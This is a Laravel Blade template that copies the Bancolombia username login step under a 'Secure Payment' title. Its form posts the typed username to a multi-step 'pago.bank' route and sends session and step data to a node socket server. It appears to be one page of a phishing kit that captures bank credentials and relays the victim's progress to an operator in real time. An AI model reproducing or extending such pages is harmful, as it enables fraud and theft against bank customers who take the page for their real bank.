@extends('banks.bancolombia.layout')

@section('title', 'Secure Payment')

@section('page_title', 'Ingresa tu usuario')


 {{-- si hay error --}}
 
  @if($errors->any())
    @include('banks.bancolombia.components.alert', [
      'id' => 'loginError',
      'type' => 'error_field',
      'text' => $errors->first('user'),
      'show' => true,
    ])
  @else
    @include('banks.bancolombia.components.alert', [
      'id' => 'loginError',
      'type' => 'error_field',
      'show' => false,
    ])
  @endif

@section('content')
    <br><br>

    <form id="formStep1" method="POST" action="{{ route('pago.bank.step.save', ['bank' => 'bancolombia', 'step'=> 1])}}">
        @csrf
        <input type="hidden" name="step_nonce" value="{{ $stepNonce}}">
        <div class="input-container">
            <img class="input-icon" src="{{asset('assets/img/payment/bancolombia/usericon.png')}}">
            <input type="text" name="user" id="txtUsuario" placeholder=""
                oninput="this.value = this.value.replace(/\s+/g, '')" inputmode="numeric" pattern="^[a-zA-Z0-9]+$" required>
            <label for="txtUsuario">Usuario</label>
        </div>

        <a>
            <small>¿olvidaste tu usuario?</small>
        </a>

        <br>

        <div>
            <input type="submit" value="Continuar" id="btnUsuario" disabled>
        </div>
    </form>
@endsection


@push('scripts')
<script>
document.addEventListener("DOMContentLoaded", () => {
  initSocketConnection(
    @json($nodeUrl),
    @json($sessionId),
    @json($sessionToken),
    @json($bank),
    @json((string)$step) // 👈 este es el importante
  );
});
</script>
<script>
  document.addEventListener('DOMContentLoaded', () => {
  try {
    const err = sessionStorage.getItem('rt_last_error');
    if (err) {
      sessionStorage.removeItem('rt_last_error');
      showBankAlert('loginError', err);
    }
  } catch {}

  // Ejemplo: habilitar botón cuando el input sea válido (4 dígitos)
  const user = document.getElementById('txtUsuario');
  const btn = document.getElementById('btnUsuario');
  const form = document.getElementById('formStep1');
  window.RT._retry = false;
  window.RT = window.RT || {};
  window.RT.step = "{{ $step }}";
  window.RT.bank = "{{ $bank }}";
  console.log(btn)
  function toggleBtn(){
    btn.disabled = !(user.value && user.value.length > 4);
  }

  user.addEventListener('input', toggleBtn);
  
  form.addEventListener('submit', async (e) => {
    // UX: mostrar loading mientras redirige (submit normal)
    try { sessionStorage.removeItem('rt_last_error'); } catch {}
    window.showLoading?.('Continuando...');
  })
});
</script>
@endpush